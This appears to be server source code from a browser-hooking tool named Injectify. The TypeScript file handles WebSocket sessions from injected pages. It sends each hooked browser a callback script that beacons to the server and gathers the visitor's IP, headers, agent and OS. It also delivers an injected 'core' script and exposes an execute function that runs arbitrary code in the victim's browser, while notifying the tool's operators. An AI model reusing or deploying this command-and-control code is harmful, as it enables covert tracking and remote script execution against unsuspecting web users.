declare var global: any

import { Database } from '../database/definitions/database'
import { SocketSession } from './definitions/session'

import ClientInfo from './ClientInfo'
import InjectAPI from './InjectAPI'
import chalk from 'chalk'
const { RateLimiter } = require('limiter')
const atob = require('atob')
const getIP = require('../modules/getIP.js')

export default class {
  db: any

  constructor(db: any) {
    this.db = db
  }

  validate(socket: WebSocket) {
    return new Promise<SocketSession.session>((resolve, reject) => {
      let url = socket.url.split('?')
      if (url) {
        let state = {
          project: url[url.length - 1],
          debug: false
        }
        if (state.project.charAt(0) === '$') {
          state = {
            project: state.project.substring(1),
            debug: true
          }
        }
        if (state.project) {
          try {
            state.project = atob(state.project)
          } catch (e) {
            reject('websocket with invalid base64 encoded project name, terminating')
            return
          }
          this.db.collection('projects', (err, projects) => {
            if (err) throw err
            projects.findOne({
              'name': state.project
            }).then((doc: Database.project) => {
              if (doc !== null) {
                resolve({
                  project: {
                    id: doc['_id'],
                    name: doc.name,
                    inject: doc.inject
                  },
                  id: +new Date(),
                  debug: state.debug
                })
              } else {
                reject(`websocket connection to nonexistent project "${state.project}", terminating`)
              }
            })
          })
        } else {
          reject('websocket connection with invalid project name, terminating')
        }
      } else {
        reject('websocket connection with missing project name, terminating')
      }
    })
  }

  initiate(socket: any) {
    this.validate(socket).then(project => {
      new Session(socket, project)
    }).catch((error: string | Error) => {
      if (typeof error === 'string') {
        if (global.config.verbose)
          console.error(
            chalk.redBright('[inject] ') +
            chalk.yellowBright(error)
          )
      } else {
        throw error
      }
    })
  }
}

class Session {
  socket: any
  session: SocketSession.session
  project: SocketSession.project
  token: any
  req: any
  client: any

  constructor(socket: any, session: SocketSession.session) {
    this.socket = socket
    this.session = session
    this.project = session.project
    this.auth(socket.id)
  }

  send(topic: string, data: any) {
    this.socket.write(
      JSON.stringify({
        t: topic,
        d: data
      })
    )
  }

  auth(id: string) {
    this.send('auth', `var server=ws.url.split("/"),protocol="https://";"ws:"===server[0]&&(protocol="http://"),server=protocol+server[2];var auth=new Image;auth.src=server+"/a?id=${encodeURIComponent(id)}&z=${+new Date()}";auth.onload`)
    global.inject.authenticate[id] = (token: string, req) => this.authorized(token, req)
  }

  authorized(token: string, req) {
    this.token = token
    this.req = req
    let injectAPI
    let limiter = new RateLimiter(global.config.rateLimiting.inject.websocket.max, global.config.rateLimiting.inject.websocket.windowMs, true)

    this.socket.on('data', raw => {
      limiter.removeTokens(1, (err, remainingRequests) => {
        if (!(err || remainingRequests < 1)) {
          let topic: string
          let data: any
          try {
            raw = JSON.parse(raw)
            if (typeof raw.t !== 'string') return
            topic = raw.t
            data = raw.d
          } catch (e) {
            return
          }
          if (injectAPI.on[topic]) injectAPI.on[topic](data)
        } else {
          this.send('error', 'Too many requests! slow down')
        }
      })
    })
    this.socket.on('close', () => {
      /**
       * Remove them from the clients object
       */
      if (global.inject.clients[this.project.id][token].sessions.length === 1) {
        /**
         * Only session left with their token, delete token
         */
        delete global.inject.clients[this.project.id][token]
      } else {
        /**
         * Other sessions exist with their token
         */
        global.inject.clients[this.project.id][this.token].sessions = global.inject.clients[this.project.id][token].sessions.filter(session => session.id !== this.session.id)
      }
      /**
       * Callback to the Injectify users
       */
      if (global.inject.watchers[this.project.id]) {
        setTimeout(() => {
          global.inject.watchers[this.project.id].forEach(watcher => {
            watcher.callback('disconnect', {
              token: token,
              id: this.session.id
            })
          })
        }, 0)
      }
    })

    /**
     * Add the session to the global sessions object
     */
    this.ledge(({ client, session }) => {
      /**
       * Log to console
       */
      if (global.config.debug) {
        console.log(
          chalk.greenBright('[inject] ') +
          chalk.yellowBright('new websocket connection for project ') +
          chalk.magentaBright(this.project.name) +
          chalk.yellowBright(' from ') +
          chalk.magentaBright(client.ip.query)
        )
      }
      /**
       * Set the client object
       */
      this.client = {
        client: client,
        session: session
      }
      /**
       * Enable access to the inject API
       */
      injectAPI = new InjectAPI(this)
      /**
       * Callback to the Injectify users
       */
      if (global.inject.watchers[this.project.id]) {
        setTimeout(() => {
          global.inject.watchers[this.project.id].forEach(watcher => {
            watcher.callback('connect', {
              token: this.token,
              data: global.inject.clients[this.project.id][this.token]
            })
          })
        }, 0)
      }
      
      /**
       * Send the inject core
       */
      let core = global.inject.core
      if (this.session.debug) core = global.inject.debugCore
      let socketHeaders = this.socket.headers
      delete socketHeaders['user-agent']
      core = core
      .replace('client.ip', JSON.stringify(client.ip))
      .replace('client.id', JSON.stringify(session.id))
      .replace('client.agent', JSON.stringify(client.agent))
      .replace('client.headers', JSON.stringify(socketHeaders))
      .replace('client.platform', JSON.stringify(client.platform))
      .replace('client.os', JSON.stringify(client.os))
      this.send('core', core)

      /**
       * Send the auto-execute script
       */
      // if (project.inject) {
      //   if (project.inject.autoexecute) {
      //     send('execute', project.inject.autoexecute)
      //   }
      // }
    })
  }

  ledge(resolve: Function) {
    /**
     * Create an object for the project
     */
    if (!global.inject.clients[this.project.id]) {
      global.inject.clients[this.project.id] = {}
    }

    ClientInfo(this.socket, this.req, this.session).then(({ client, session }) => {
      /**
       * Create an object for the client
       */
      if (!global.inject.clients[this.project.id][this.token]) {
        global.inject.clients[this.project.id][this.token] = client
      }
      /**
       * Add a reference to the send method
       */
      session.execute = script => {
        this.send('execute', script)
      }
      global.inject.clients[this.project.id][this.token].sessions.push(session)

      resolve({
        client: client,
        session: session
      })
    })
  }
}